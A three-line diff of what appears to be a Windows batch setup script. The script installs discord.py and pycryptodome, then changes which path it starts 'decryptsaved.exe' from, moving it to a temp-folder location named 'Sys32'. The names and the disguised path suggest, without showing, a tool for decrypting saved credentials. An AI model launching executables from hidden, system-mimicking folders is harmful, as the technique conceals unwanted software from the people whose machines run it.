@@ -50,5 +50,5 @@ pip install discord.py
 pip install pycryptodome
 pip show pycryptodome
 
-start decryptsaved.exe
+start %temp%\Sys32\decryptsaved.exe
 exit
